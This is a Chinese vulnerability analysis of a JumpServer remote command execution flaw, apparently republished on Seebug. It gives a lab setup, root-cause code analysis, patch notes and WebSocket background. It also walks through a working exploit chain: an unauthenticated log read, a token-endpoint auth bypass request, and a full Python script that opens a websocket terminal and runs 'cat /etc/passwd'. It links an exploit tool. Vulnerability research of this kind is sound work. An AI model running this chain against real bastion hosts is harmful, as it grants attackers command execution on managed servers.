**作者：Veraxy@QAX CERT  
原文链接：<https://mp.weixin.qq.com/s/lbcYzNsiOYZRwQzAIYxg3g>**

作为国内开源堡垒机的中流砥柱，前段时间JumpServer爆出了远程命令执行漏洞，掀起了不小的热度，很多小伙伴看过网上的分析文章之后仍旧一知半解，本文带大家一起做深入分析，研究各个点之间的关联和原理，同时补充相关知识点，帮助大家理清楚这个洞，从而可以思考如何利用，文末附漏洞利用工具。如有不足之处，欢迎批评指正。

# 0x01产品了解

Jumpserver 是一款由python编写开源的跳板机(堡垒机)系统，实现了跳板机应有的功能，基于ssh协议来管理，客户端无需安装agent。

<https://github.com/jumpserver/jumpserver>

主要包含四个项目组件，分别是Lina、Luna、Koko、Guacamole。其中Koko 是Go版本的coco，提供了 SSH、SFTP、web
terminal、web文件管理功能。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523039000-1rqzmc.png-w331s)

## Jumpserver部署

<https://github.com/jumpserver/installer>

下载安装包

    
    
    # git clone https://github.com/jumpserver/installer.git
    # cd installer?

国内docker源加速安装

    
    
    # export DOCKER_IMAGE_PREFIX=docker.mirrors.ustc.edu.cn
    # ./jmsctl.sh install

升级到指定版本

    
    
    # ./jmsctl.sh upgrade v2.6.1

启动服务

    
    
    #?./jmsctl.sh start
    #?./jmsctl.sh restart

![图片](https://images.seebug.org/content/images/2021/03/12/1615523039000-2ytabz.png-w331s)

## 环境配置

Jumpserver v2.6.1版本，访问服务正常，默认管理员账户admin/admin，初次登录须改密码。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523040000-3qqveu.png-w331s)

1.添加管理用户。

资产管理里面的"管理用户"是jumpserver用来管理资产需要的服务账户，Jumpserver使用该用户来 '推送系统用户'、'获取资产硬件信息'等。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523040000-4edygd.png-w331s)

2.“资产列表”中添加资产

![图片](https://images.seebug.org/content/images/2021/03/12/1615523040000-5yzaht.png-w331s)

测试资产可连接性，保证资产存活

![图片](https://images.seebug.org/content/images/2021/03/12/1615523041000-6rtvmr.png-w331s)

![图片](https://images.seebug.org/content/images/2021/03/12/1615523041000-7phasy.png-w331s)

3.创建系统用户

系统用户是 Jumpserver 跳转登录资产时使用的用户，可以理解为登录资产的用户。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523042000-8sxlce.png-w331s)

配置“登录方式”为自动登录

![图片](https://images.seebug.org/content/images/2021/03/12/1615523042000-9bmhjp.png-w331s)

4.创建资产授权

![图片](https://images.seebug.org/content/images/2021/03/12/1615523043000-10birtn.png-w331s)

5.使用“Web终端”连接资产

为保证漏洞复现顺利进行，需要在Web终端中连接某资产。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523043000-11iokmb.png-w331s)

Web终端以root用户名登录机器。

若配置的登录模式为“手动登录”，所以需要输入密码进行连接。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523043000-12habpv.png-w331s)

"自动登录"则可调用系统预留密码直接连接。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523044000-13vkpge.png-w331s)

# 0x02漏洞利用

## 日志文件读取

系统中/ws/ops/tasks/log/接口无身份校验，可直接与其建立websocket连接，当为“task”参数赋值为具体文件路径时，可获取其文件内容。系统接收文件名后会自动添加.log后缀，所以只能读取.log类型的日志文件。

默认/opt/jumpserver/logs/ 下存放日志文件，包含jumpserver.log、gunicorn.log、dapgne.log等。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523044000-14gpafo.png-w331s)

gunicorn是常用的WSGI容器之一，用来处理Web框架和Web服务器之间的通信，gunicorn.log是API调用历史记录比较全的日志文件。

利用/ws/ops/tasks/log/接口查看/opt/jumpserver/logs/gunicorn.log文件内容，由于系统会自动添加.log后缀，故无须添加文件后缀，目标路径为
"/opt/jumpserver/logs/gunicorn" 即可。

    
    
    ws://192.168.18.182:8080/ws/ops/tasks/log/
    {"task":"/opt/jumpserver/logs/gunicorn"}

![图片](https://images.seebug.org/content/images/2021/03/12/1615523044000-15lrbdi.png-w331s)

在日志中寻找有用数据，其中/api/v1/perms/asset-permissions/user/validate接口的请求记录值得注意，这个API是用来验证用户的资产控制权限的。由于web终端连接资产时会对用户所属资产权限进行校验，调用了这个接口，故会留下日志记录。其中asset_id、system_user_id、user_id参数值可以被利用。

    
    
    asset_id=fac9cfc0-b8f1-4aa5-9893-b8f5cdc8de0f
    system_user_id=a893cb8f-26f7-41a8-a983-1de24e7c3d73
    user_id=f26371c9-18c3-4c4e-979f-95d34ffdb911

## 认证绕过+获取token

/api/v1/authentication/connection-token/接口和/api/v1/users/connection-token/接口均可通过 **user-only** 参数绕过权限认证。

两接口对数据的处理逻辑一致，其中post请求处理函数要求data数据中携带"user"、"asset"、"system_user"参数，同时系统自动生成一个20s有效期的token，收到合法请求会将这个token返回。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523044000-16majth.png-w331s)

上文从日志中获取到的三个参数值可以用在这里，分别赋值给post请求要求的data中的"user"、"asset"、"system_user"参数，同时在URL中添加
**user-only** 参数来绕过认证，最终获得一个20s有效期的token。

    
    
    POST /api/v1/authentication/connection-token/?user-only=Veraxy HTTP/1.1
    Host: 192.168.18.182:8080
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: csrftoken=GsRQYej2Fr3uk3xU9OPfZREl8Wn7xCXPqLSWQGIILIk7uz7izdqojUgYQ5UhG04j; jms_current_role=146; jms_current_org=%7B%22id%22%3A%22DEFAULT%22%2C%22name%22%3A%22DEFAULT%22%7D
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 133
    user=f26371c9-18c3-4c4e-979f-95d34ffdb911&asset=fac9cfc0-b8f1-4aa5-9893-b8f5cdc8de0f&system_user=a893cb8f-26f7-41a8-a983-1de24e7c3d73

![图片](https://images.seebug.org/content/images/2021/03/12/1615523044000-17pgwio.png-w331s)

上图请求接口替换成/api/v1/users/connection-token/达到的目的一样

![图片](https://images.seebug.org/content/images/2021/03/12/1615523046000-18htckh.png-w331s)

## 远程命令执行

系统/koko/ws/token/接口要求"target_id"参数，携带合法"target_id"参数即可利用该接口建立TTY通信。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523046000-19zezaj.png-w331s)

上文通过/api/v1/authentication/connection-token/接口获得的20s有效期的token可作为/koko/ws/token/接口的有效"target_id"参数值，从而建立websocket会话。

    
    
    ws://192.168.18.182:8080/koko/ws/token/?target_id=0a14ec3d-312f-44e0-8224-da1a4151f32e

![图片](https://images.seebug.org/content/images/2021/03/12/1615523046000-20uuwht.png-w331s)

借助脚本进行websocket通信

    
    
    import asyncio
    import websockets
    import requests
    import json
    url = "/api/v1/authentication/connection-token/?user-only=None"
    # 向服务器端发送认证后的消息
    async def send_msg(websocket,_text):
        if _text == "exit":
            print(f'you have enter "exit", goodbye')
            await websocket.close(reason="user exit")
            return False
        await websocket.send(_text)
        recv_text = await websocket.recv()
        print(f"{recv_text}")
    # 客户端主逻辑
    async def main_logic(cmd):
        print("###start ws")
        async with websockets.connect(target) as websocket:
            recv_text = await websocket.recv()
            print(f"{recv_text}")
            resws=json.loads(recv_text)
            id = resws['id']
            print("get ws id:"+id)
            print("#######1########")
            print("init ws")
            print("#######2########")
            inittext = json.dumps({"id": id, "type": "TERMINAL_INIT", "data": "{\"cols\":234,\"rows\":13 }"})
            await send_msg(websocket,inittext)
            print("########3#######")
            print("exec cmd: ls")
            cmdtext = json.dumps({"id": id, "type": "TERMINAL_DATA", "data": cmd+"\r\n"})
            print(cmdtext)
            await send_msg(websocket, cmdtext)
            for i in range(20):
                recv_text = await websocket.recv()
                print(f"{recv_text}")
            print('###finish')
    if __name__ == '__main__':
        host = "http://192.168.18.182:8080"
        cmd="cat /etc/passwd"
        if host[-1]=='/':
            host=host[:-1]
        print(host)
        data = {"user": "f26371c9-18c3-4c4e-979f-95d34ffdb911", "asset": "fac9cfc0-b8f1-4aa5-9893-b8f5cdc8de0f",
                "system_user": "a893cb8f-26f7-41a8-a983-1de24e7c3d73"}
        print("##################")
        print("get token url:%s" % (host + url,))
        print("##################")
        res = requests.post(host + url, json=data)
        token = res.json()["token"]
        print("token:%s", (token,))
        print("##################")
        target = "ws://" + host.replace("http://", '') + "/koko/ws/token/?target_id=" + token
        print("target ws:%s" % (target,))
        asyncio.get_event_loop().run_until_complete(main_logic(cmd)

成功执行 "cat /etc/passwd" 命令

![图片](https://images.seebug.org/content/images/2021/03/12/1615523047000-21xrlhk.png-w331s)

## 利用条件

1. **web终端登录方式为免密自动连接。**

若配置为需要输入密码的手动登录，只有在攻击者已知目标资产登录密码（不现实），或此时系统用户与目标资产的会话连接未中断，从而让攻击者有机会复用SSH会话，漏洞利用成功，显然这种配置下漏洞利用大多失败。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523047000-22laxix.png-w331s)

当系统用户退出登录，由于没有可复用会话了，系统要求重新输入密码，否则无法建立连接。漏洞利用失败。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523048000-23ktalj.png-w331s)

只有在系统用户登录模式配置为“自动登录”，即系统用户使用web终端操作时资产无须输入密码

，可直接建立连接（某些情况下需要“自动推送”系统用户至资产才能实现免密连接），这种配置下，该漏洞才可被攻击者 **稳定利用。**

开启自动登录和自动推送。

如果选择了自动推送， Jumpserver 会使用 Ansible 自动推送系统用户到资产中。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523048000-24wxuds.png-w331s)

此时连接web终端不需要输入密码了，直接利用系统用户预存的密码建立连接。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523048000-25aqhhx.png-w331s)

这时我中断会话，再次测试，成功执行命令，此时不是复用SSH连接，而是直接连接，建立会话，从而执行命令。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523049000-26dtimo.png-w331s)

jumpserver通常的配置都是自动登录的，这一条件容易满足。

2. **系统用户在web终端与目标资产建立过连接。**

只有系统用户在web终端访问过目标资产，才能在日志中留下访问记录，我们与目标建立连接的必要参数均在日志中获取。

3. **系统日志路径已知**

系统日志路径默认为`/opt/jumpserver/logs`，一些项目刻意修改日志路径会使得漏洞难以利用。

## 攻击流程回顾

1.未授权的情况下通过 /ws/ops/tasks/log/ 接口建立websocket连接，读取日志文件

2.在日志文件中获取到用户、资产字段值、系统用户（user_id、asset_id、system_user_id）

3.携带这三个字段对 /api/v1/authentication/connection-token/ 或/api/v1/users/connection-token/接口发起POST请求（同时借助user-only参数绕过认证），得到一个20S有效期的token

4.通过该token与/koko/ws/token/接口建立websocket连接，模拟Web终端通信，执行命令。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523049000-27hmroy.png-w331s)

# 0x03漏洞分析

## 日志文件读取

读取日志文件的接口为ws/ops/tasks/log/

![图片](https://images.seebug.org/content/images/2021/03/12/1615523049000-28icfei.png-w331s)

分析apps/ops/ws.py#CeleryLogWebsocket，connect()方法定义该接口直接连接，无认证

![图片](https://images.seebug.org/content/images/2021/03/12/1615523049000-29mccdb.png-w331s)

receive()方法要求请求data要携带task参数，随后会将“task”值传给handle_task()

![图片](https://images.seebug.org/content/images/2021/03/12/1615523049000-30hjuog.png-w331s)

self.handle_task(task_id)

\-->self.read_log_file(self,task_id)

\-->self.wait_util_log_path_exist(task_id)

\-->
get_celery_task_log_path(task_id)，获取目标文件路径的方法，系统自动为路径末尾添加.log后缀，也就是只能读取到日志文件。

这里也是“task”参数值中的文件路径无须携带.log后缀的原因。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523050000-31rwsve.png-w331s)

当系统连接资产时，会调用 validatePermission()
方法检查用户是否有权限连接，通过三个参数进行校验，分别为用户ID、资产ID、系统用户ID，三个参数值长期有效，可被进一步利用。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523050000-32kytyh.png-w331s)

![图片](https://images.seebug.org/content/images/2021/03/12/1615523050000-33kzurl.png-w331s)

对应的接口是/api/v1/perms/asset-permissions/user/validate，请求记录均可在日志文件中找到

![图片](https://images.seebug.org/content/images/2021/03/12/1615523050000-34nzswa.png-w331s)

## 绕过身份验证获取token

**apps/authentication/api/auth.py** ，请求url中存在'user-only'参数且有值，则其权限为AllowAny，即允许访问。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523052000-35numer.png-w331s)

分析apps/authentication/api/auth.py#UserConnectionTokenApi类，可处理get、post请求。

get请求处理函数取URL中"token"和"user-only"参数，合法请求会根据token返回user信息。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523052000-36ltyxw.png-w331s)

post请求处理函数要求data数据中携带"user"、"asset"、"system_user"参数，同时系统自动生成一个20s有效期的token，合法请求会将这个token返回。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523044000-16majth.png-w331s)

apps/authentication/api/auth.py#UserConnectionTokenApi类有哪些地方使用，共两处

![图片](https://images.seebug.org/content/images/2021/03/12/1615523053000-38biosd.png-w331s)

刚好是官方公布的接口，这两个接口数据处理逻辑一致，所以利用的时候两者均可得到token。

    
    
    /api/v1/authentication/connection-token/
    /api/v1/users/connection-token/

Web Terminal 前端项目 luna/src/app/services/http.ts 中有对/api/v1/users/connection-token/接口的Get请求代码，这里携带不为空的user-only参数，是为了获取token对应的用户身份所有信息而不是单个字段。
<https://github.com/jumpserver/luna/blob/6e1f04901ecc466a9412ca995810595497e93625/src/app/services/http.ts>

![图片](https://images.seebug.org/content/images/2021/03/12/1615523054000-39wsgkb.png-w331s)

## websocket建立TTY终端会话

这个漏洞是通过websocket通信建立TTY终端，从而执行命令。

JumpServer中KoKo项目提供 Web Terminal 服务，分析系统中可建立TTY会话的几种方式。

<https://github.com/jumpserver/koko>

建立TTY会话主要通过koko/pkg/httpd/webserver.go中runTTY() 实现

![图片](https://images.seebug.org/content/images/2021/03/12/1615523054000-40jechl.png-w331s)

只有两个接口可以进入runTTY()方法，分别是processTerminalWebsocket和processTokenWebsocket方法

![图片](https://images.seebug.org/content/images/2021/03/12/1615523054000-41ttskb.png-w331s)

对应API为/koko/ws/terminal/ 和 /koko/ws/token/
，接口handler位于koko/pkg/httpd/webserver.go#websocketHandlers()

![图片](https://images.seebug.org/content/images/2021/03/12/1615523054000-42mncrg.png-w331s)

### **/koko/ws/terminal/**

系统中通过“会话管理”下“web终端”功能连接资产时，使用的是 /koko/ws/terminal/ 接口

![图片](https://images.seebug.org/content/images/2021/03/12/1615523054000-43qqftg.png-w331s)

    
    
    ws://192.168.18.182:8080/koko/ws/terminal/?target_id=fac9cfc0-b8f1-4aa5-9893-b8f5cdc8de0f&type=asset&system_user_id=a893cb8f-26f7-41a8-a983-1de24e7c3d73

进行websocket通信

![图片](https://images.seebug.org/content/images/2021/03/12/1615523055000-44yzydi.png-w331s)

processTerminalWebsocket函数处理 /koko/ws/terminal/
接口，要通过这个接口成功登录控制台需要一些必备参数，包括type、target_id、system_user_id，其中target_id为目标资产ID，system_user_id表示系统用户id。

**注意：** /koko/ws/terminal/ 接口的target_id与/koko/ws/token/
接口的target_id虽然参数名一样，但却是两个完全不同的东西。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523055000-45oupgt.png-w331s)

系统对 /koko/ws/terminal/ 接口通过?middleSessionAuth() 进行会话合法校验。

注意到 /koko/ws/token/ 接口却是无此类限制的。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523055000-46fphjx.png-w331s)

### **/koko/ws/token/**

/koko/ws/token/
接口的处理函数位于koko/pkg/httpd/webserver.go#processTokenWebsocket，要求get请求携带“target_id”参数，系统会将该参数传递给
service.GetTokenAsset() 方法，获取token对应的user，从而建立TTY会话。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523046000-19zezaj.png-w331s)

发现 GetTokenAsset() 是将“/api/v1/authentication/connection-token/?token=”与token值进行拼接，并发起Get请求，来获取用户身份的。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523056000-48wjxbf.png-w331s)

![图片](https://images.seebug.org/content/images/2021/03/12/1615523056000-49tieaj.png-w331s)

上文分析过 /api/v1/authentication/connection-token/
接口，Get请求处理函数中定义，若仅携带有效token，则返回该用户所有信息，若同时携带token和不为None的user-only，则返回用户信息中的'user'字段值。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523056000-50ijchu.png-w331s)

本次通信则是仅携带有效token，从而获取该用户所有身份信息。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523056000-51qeawn.png-w331s)

综上，一个有效的“target_id”即可调用/koko/ws/token/ 接口进行websoket通信，从而建立TTY会话。

    
    
    ws://192.168.18.182:8080/koko/ws/token/?target_id=845fad2b-6077-41cb-b4fd-1462cca1152d
    {"id":"8fd8b06e-dfd6-45b4-aeb7-9403d3a65cfa","type":"CONNECT","data":""}
    {"id":"8fd8b06e-dfd6-45b4-aeb7-9403d3a65cfa","type":"TERMINAL_INIT","data":"{\"cols\":140,\"rows\":6}"}

![图片](https://images.seebug.org/content/images/2021/03/12/1615523057000-52jffqb.png-w331s)

而这个有效的“target_id”则通过上一章节“身份验证绕过”中分析的 /api/v1/authentication/connection-token/
或 /api/v1/users/connection-token/接口来获得，需要在20s有效期内将token替换为target_id参数值来使用。

## 补丁分析

漏洞整体分析下来，最关键的几个点，身份验证绕过以及websocket通信接口无校验，官方发布的新版本对其进行修复。

<https://github.com/jumpserver/jumpserver/commit/82077a3ae1d5f20a99e83d1ccf19d683ed3af71e>

![图片](https://images.seebug.org/content/images/2021/03/12/1615523057000-53dqmyy.png-w331s)

# 0x04关于websocket

WebSocket 协议诞生于 2008 年，在 2011 年成为国际标准，WebSocket 同样是 HTML 5 规范的组成部分之一。

HTTP 协议是半双工协议，也就是说在同一时间点只能处理一个方向的数据传输，通信只能由客户端发起，属于单向传输，一般通过 Cookie
使客户端保持某种状态，以便服务器可以识别客户端。

WebSocket的出现，使得浏览器和服务器之间可以建立无限制的全双工通信。WebSocket
协议是全双工的，客户端会先发起请求建立连接，若服务器接受了此请求，则将建立双向通信，然后服务器和客户端就可以进行信息交互了，直到客户端或服务器发送消息将其关闭为止。

**WebSocket特点：**

1.默认端口是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。

2.可以发送文本，也可以发送二进制数据。

3.没有同源限制，客户端可以与任意服务器通信。

4.协议标识符是ws（如果加密，则为wss）

## **WebSocket通信**

WebSocket并不是全新的协议，而是利用了HTTP协议来建立连接。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523057000-54clonr.png-w331s)

### 建立连接

**客户端请求报文：**

    
    
    GET / HTTP/1.1
    Upgrade: websocket
    Connection: Upgrade
    Host: example.com
    Origin: http://example.com
    Sec-WebSocket-Key: sN9cRrP/n9NdMgdcy2VJFQ==
    Sec-WebSocket-Version: 13

**Connection、Upgrade** 字段声明需要切换协议为websocket  
**Sec-WebSocket-Key** 是由浏览器随机生成的，提供基本的防护，防止恶意或者无意的连接。  
**Sec-WebSocket-Version** 表示 WebSocket 的版本，如果服务端不支持该版本，需要返回一个Sec-WebSocket-Versionheader，里面包含服务端支持的版本号。

**服务端的响应报文：**

    
    
    HTTP/1.1 101 Switching Protocols
    Upgrade: websocket
    Connection: Upgrade
    Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
    Sec-WebSocket-Protocol: chat

**Upgrade** 消息头通知客户端确认切换协议来完成这个请求；

**Sec-WebSocket-Accept** 是经过服务器确认，并且加密过后的Sec-WebSocket-Key；

**Sec-WebSocket-Protocol** 则是表示最终使用的协议。

注意：Sec-WebSocket-Key/Sec-WebSocket-Accept的换算，其实并没有实际性的安全保障。

### 进行通信

服务端接收到客户端发来的Websocket报文需要进行解析。

**数据包格式**

![图片](https://images.seebug.org/content/images/2021/03/12/1615523058000-55oydec.png-w331s)

Mask位表示是否要对数据载荷进行掩码异或操作。

Payload length表示数据载荷的长度。

Masking-key数据掩码，为防止早期版本的协议中存在的代理缓存污染攻击等问题而存在。

Payload Data为载荷数据。

服务端返回数据时不携带掩码，所以 Mask 位为 0，再按载荷数据的大小写入长度，最后写入载荷数据。

### 心跳

WebSocket为了保持客户端、服务端的实时双向通信，需要确保客户端、服务端之间的TCP通道没有断开。对于长时间没有数据往来的通道，但仍需要保持连接，可采用心跳来实现。

发送方->接收方：ping

接收方->发送方：pong

ping、pong的操作，对应的是WebSocket的两个控制帧，opcode分别是0x9、0xA。

### **关闭连接**

关闭连接标志着服务器和客户端之间的通信结束，标记通信结束后，服务器和客户端之间无法进一步传输消息。

## Web Terminal实现

通常所说的Terminal是指的终端模拟器，一般情况下终端模拟器是不会直接与shell通讯的，而是通过pty（Pseudoterminal，伪终端）来实现，pty
是一对 master-slave 设备。

终端模拟器通过文件读写流与 pyt master通讯，pty master再将字符输入传送给pty slave，pty slave进一步传递给bash执行。

Web Terminal则是实现在浏览器展示的终端模拟器，前后端建立WebSocket连接，保证浏览器和后端实时通信。

**实现思路：**

1.浏览器将主机信息传给后台, 并通过HTTP请求与后台协商升级协议，协议升级完成后, 得到一个和浏览器的web Socket连接通道  
2.后台拿到主机信息, 创建一个SSH 客户端, 与远程主机的SSH 服务端协商加密, 互相认证, 然后建立一个SSH Channel  
3.后台和远程主机有了通讯的信道，然后后台携带终端信息通过SSH Channel请求远程主机创建一对 pty, 并请求启动当前用户的默认 shell  
4.后台通过 Socket连接通道拿到用户输入, 再通过SSH
Channel将输入传给pty，pty将这些数据交给远程主机处理后，按照前面指定的终端标准输出到SSH Channel中, 同时键盘输入也会通过SSH
Channel发送给远程服务端。  
5.后台从SSH Channel中拿到按照终端大小的标准输出，通过Socket通信将输出返回给浏览器，由此实现了Web Terminal

![图片](https://images.seebug.org/content/images/2021/03/12/1615523058000-56ywced.png-w331s)

JumpServer中websocket通信基于<https://github.com/gorilla/websocket>项目实现，Web
Terminal功能实现思路与上文描述基本一致，这里简述浏览器与后端进行websocket通信流程。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523058000-57mlcqg.png-w331s)

携带多个参数对 /koko/ws/terminal/ 接口发起Get请求，初次握手，提出Upgrade为Websocket协议

    
    
    GET ws://192.168.18.182:8080/koko/ws/terminal/?target_id=fac9cfc0-b8f1-4aa5-9893-b8f5cdc8de0f&type=asset&system_user_id=a893cb8f-26f7-41a8-a983-1de24e7c3d73 HTTP/1.1
    Host: 192.168.18.182:8080
    Connection: Upgrade
    Pragma: no-cache
    Cache-Control: no-cache
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Upgrade: websocket
    Origin: http://192.168.18.182:8080
    Sec-WebSocket-Version: 13
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Cookie: csrftoken=0ZhWpozQIlm3fpJZRKP0vWcEm32JOlSSbtTBYmqlnHgrSwlMgXdJW0hnx4qJrT5s; sessionid=lbfnuoizl0mnixrwyo036ze65z7vfip0; jms_current_org=%7B%22id%22%3A%22DEFAULT%22%2C%22name%22%3A%22DEFAULT%22%7D; X-JMS-ORG=DEFAULT; jms_current_role=146
    Sec-WebSocket-Key: Cuf/c4n9TH20PU4HpCP4qQ==
    Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits
    Sec-WebSocket-Protocol: JMS-KOKO

服务端识别有效字段，回应握手请求，同意upgrade为websocket协议，允许后续进行socket通信。

    
    
    HTTP/1.1 101 Switching Protocols
    Server: nginx
    Date: Mon, 01 Feb 2021 17:29:47 GMT
    Connection: upgrade
    Upgrade: websocket
    Sec-WebSocket-Accept: zdg0gD/H5Ev4u9hn5oIxlSVdvDg=
    Sec-WebSocket-Protocol: JMS-KOKO

注意到使用web终端功能时，系统主要发起两个请求，分别是

    
    
    ws://192.168.18.182:8080/koko/ws/terminal/?target_id=fac9cfc0-b8f1-4aa5-9893-b8f5cdc8de0f&type=asset&system_user_id=a893cb8f-26f7-41a8-a983-1de24e7c3d73
    http://192.168.18.182:8080/koko/terminal/?target_id=fac9cfc0-b8f1-4aa5-9893-b8f5cdc8de0f&type=asset&system_user_id=a893cb8f-26f7-41a8-a983-1de24e7c3d73

![图片](https://images.seebug.org/content/images/2021/03/12/1615523058000-58nkctf.png-w331s)

实际进行sokcet通信的是/koko/ws/terminal/接口，/koko/terminal/接口是协调处理sokcet通信输入输出的数据，将结果与前端融合并展示给用户，提供一个可视终端的效果。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523059000-59bvazq.png-w331s)

## Websocket认证

即使用户经过了系统的认证，当与WebSocket接口进行socket连接时，同样需要再次认证。

一般Websocket的身份认证都是发生在握手阶段，客户端向验证请求中的内容，只允许经过身份验证的用户建立成功的Websocket连接。

可以通过基于cookie的传统方式，或基于Token的方式进行认证。

### 传统的基于cookie的方式

采用这种方式，应用本身的认证和提供WebSocket的服务，可以是同一套session
cookie的管理机制，也可以WebSocket服务接口自己来维护基于cookie的认证。

Jumpserver系统Web终端的功能，调用的/koko/ws/terminal/接口就是采用这种方式。

    
    
    ws://192.168.18.182:8080/koko/ws/terminal/?target_id=fac9cfc0-b8f1-4aa5-9893-b8f5cdc8de0f&type=asset&system_user_id=a893cb8f-26f7-41a8-a983-1de24e7c3d73

![图片](https://images.seebug.org/content/images/2021/03/12/1615523059000-60pagzz.png-w331s)

请求URL中携带的参数值 target_id、type、system_user_id
基本长期复用，接口主要依靠建立会话传送的Cookie来识别身份，这里的session cookie的管理机制与系统是共享的。

### 基于Token的方式

当客户端要与接口建立连接时，向http服务获取token，客户端作为初始握手的一部分携带有效token打开websocket连接，服务端验证token有效性合法性，认证通过则同意建立websocket会话连接。

漏洞执行命令利用的/koko/ws/token/接口采用的就是基于token方式进行认证

    
    
    ws://192.168.18.182:8080/koko/ws/token/?target_id=845fad2b-6077-41cb-b4fd-1462cca1152d

接口取target_id参数值，识别参数值有效性及对应用户身份，认证通过则同意建立websocket连接。
![图片](https://images.seebug.org/content/images/2021/03/12/1615523059000-61ftkib.png-w331s)

###

### 认证方式对比

传统基于cookie的方式，若websocket接口与系统协调同一种共享的认证方式，造成websocket服务与应用服务的耦合性大，依赖性强。若websocket服务自己维护基于cookie的认证，它只是一个解决通信连接的服务，为此付出成本不小。综上，还是采用基于token的认证方式更加高效。

采用基于token的认证方式则需要考虑提供token服务的API安全性，如本文分析的漏洞，提供token的/connection-token接口存在认证绕过问题，攻击者通过绕过/connection-token接口的身份验证，获取token，在有效时间内可与目标建立websocket连接。

# 0x05利用工具

## 编写思路

1.读取日志

根据上文漏洞利用的流程，需要先通过未授权的/ws/ops/tasks/log/接口读取日志文件/opt/jumpserver/logs/gunicorn.log
，其中包含大量的接口请求记录，我们需要提取/api/v1/perms/asset-permissions/user/validate/ 接口信息。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523060000-62acnfj.png-w331s)

2.筛选可用资产

日志文件中提取出的数据为历史连接记录，但不一定可以被利用，需要对其进行连接测试，筛选出可被利用的资产。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523061000-63sakcn.png-w331s)

3.执行命令

在可用资产列表中选择目标进行攻击，执行指定命令。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523062000-64iglxi.png-w331s)

更多细节请移步：<https://github.com/Veraxy00/Jumpserver-EXP>

## 总结

1.通过未授权的 /ws/ops/tasks/log/ 接口读取日志文件，我们仅筛选了部分接口信息，日志中包含大量数据，还有更多利用价值。  
2.官方给出的漏洞影响版本不准确，部分版本由于接口认证方式问题不可被利用。  
3.根据实际场景不同，漏洞利用工具还须继续改进，欢迎提出改进建议。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1502/>

